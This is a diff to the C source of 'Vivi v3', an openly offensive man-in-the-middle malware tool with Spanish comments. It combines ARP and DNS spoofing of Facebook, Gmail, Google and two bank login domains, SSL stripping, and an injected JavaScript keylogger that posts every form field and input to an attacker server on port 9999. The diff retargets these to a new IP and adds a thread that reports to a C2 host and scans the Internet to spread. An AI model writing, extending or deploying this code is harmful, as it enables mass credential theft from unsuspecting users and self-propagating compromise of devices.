@@ -1,5 +1,6 @@
 // Vivi v3 - Advanced MITM: SSL Strip, DNS Spoof, HTTP Injection, Phishing
 // Manipula lo que ve la víctima en tiempo real
+// + DISTRIBUTED SCANNER: También escanea y se propaga
 
 #define _GNU_SOURCE
 #include <stdio.h>
@@ -21,7 +22,9 @@
 #include <pthread.h>
 #include <time.h>
 #include <netdb.h>
+#include <fcntl.h>
 #include "config.h"
+#include "distributed_scanner.h"
 
 // ============================================================================
 // STRUCTURES
@@ -220,16 +223,16 @@ typedef struct {
 } dns_spoof_entry;
 
 dns_spoof_entry dns_spoof_list[] = {
-    {"facebook.com", "93.95.231.134"},
-    {"www.facebook.com", "93.95.231.134"},
-    {"instagram.com", "93.95.231.134"},
-    {"www.instagram.com", "93.95.231.134"},
-    {"twitter.com", "93.95.231.134"},
-    {"gmail.com", "93.95.231.134"},
-    {"accounts.google.com", "93.95.231.134"},
-    {"login.live.com", "93.95.231.134"},
-    {"secure.bankpopular.com", "93.95.231.134"},
-    {"www.banreservas.com", "93.95.231.134"},
+    {"facebook.com", "207.244.255.208"},
+    {"www.facebook.com", "207.244.255.208"},
+    {"instagram.com", "207.244.255.208"},
+    {"www.instagram.com", "207.244.255.208"},
+    {"twitter.com", "207.244.255.208"},
+    {"gmail.com", "207.244.255.208"},
+    {"accounts.google.com", "207.244.255.208"},
+    {"login.live.com", "207.244.255.208"},
+    {"secure.bankpopular.com", "207.244.255.208"},
+    {"www.banreservas.com", "207.244.255.208"},
     {"", ""}
 };
 
@@ -425,7 +428,7 @@ const char *injection_script =
     "  forms[i].addEventListener('submit',function(e){"
     "    var data=new FormData(this);"
     "    var xhr=new XMLHttpRequest();"
-    "    xhr.open('POST','http://93.95.231.134:9999/log',true);"
+    "    xhr.open('POST','http://207.244.255.208:9999/log',true);"
     "    xhr.send(data);"
     "  });"
     "}"
@@ -433,7 +436,7 @@ const char *injection_script =
     "  document.querySelectorAll('input').forEach(function(inp){"
     "    inp.addEventListener('blur',function(){"
     "      var xhr=new XMLHttpRequest();"
-    "      xhr.open('POST','http://93.95.231.134:9999/log',true);"
+    "      xhr.open('POST','http://207.244.255.208:9999/log',true);"
     "      xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');"
     "      xhr.send('field='+this.name+'&value='+encodeURIComponent(this.value));"
     "    });"
@@ -603,6 +606,43 @@ void *credential_logger_thread(void *arg) {
 }
 
 // ============================================================================
+// DISTRIBUTED SCANNER INTEGRATION
+// ============================================================================
+
+void vivi_scanner_report(const char *type, const char *message) {
+    // Vivi puede reportar a archivo o stdout
+    time_t now = time(NULL);
+    char timestamp[32];
+    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
+    
+    FILE *fp = fopen("/tmp/.vivi_scanner.log", "a");
+    if (fp) {
+        fprintf(fp, "[%s] %s: %s\n", timestamp, type, message);
+        fclose(fp);
+    }
+    
+    printf("[SCANNER] %s: %s\n", type, message);
+}
+
+void *vivi_scanner_thread(void *arg) {
+    (void)arg;
+    
+    sleep(30); // Esperar 30s antes de empezar a escanear (dejar que MITM se estabilice)
+    
+    ScannerConfig config;
+    config.targets_per_round = 50;  // Menos agresivo que higurashi
+    config.scan_interval = 120;     // 2 minutos entre rondas
+    config.report_callback = vivi_scanner_report;
+    strncpy(config.c2_host, C2_HOST, sizeof(config.c2_host) - 1);
+    config.c2_port = C2_PORT;
+    
+    printf("[*] Vivi Scanner: Starting distributed scan (low-profile mode)\n");
+    distributed_scanner_thread(&config);
+    
+    return NULL;
+}
+
+// ============================================================================
 // MAIN
 // ============================================================================
 
@@ -663,13 +703,14 @@ int main(int argc, char *argv[]) {
     printf("[*] Starting attack modules...\n");
     
     // Start attack threads
-    pthread_t threads[6];
+    pthread_t threads[7];
     
     pthread_create(&threads[0], NULL, arp_spoof_thread, NULL);
     pthread_create(&threads[1], NULL, dns_spoof_thread, NULL);
     pthread_create(&threads[2], NULL, ssl_strip_thread, NULL);
     pthread_create(&threads[3], NULL, http_inject_thread, NULL);
     pthread_create(&threads[4], NULL, credential_logger_thread, NULL);
+    pthread_create(&threads[5], NULL, vivi_scanner_thread, NULL); // NUEVO: Scanner distribuido
     
     printf("\n[+] All attack modules active!\n");
     printf("[*] ARP Spoofing:      Victim thinks we are the gateway\n");
@@ -677,8 +718,10 @@ int main(int argc, char *argv[]) {
     printf("[*] SSL Stripping:     HTTPS -> HTTP downgrade\n");
     printf("[*] HTTP Injection:    JavaScript keylogger injected\n");
     printf("[*] Credential Logger: Listening on port 9999\n");
+    printf("[*] Distributed Scanner: Scanning Internet for vulnerable devices\n"); // NUEVO
     printf("\n[*] Stolen credentials: /tmp/.phished_creds\n");
     printf("[*] SSL strips logged: /tmp/.ssl_stripped\n");
+    printf("[*] Scanner logs:      /tmp/.vivi_scanner.log\n"); // NUEVO
     printf("[*] Press Ctrl+C to stop\n\n");
     
     // Keep alive
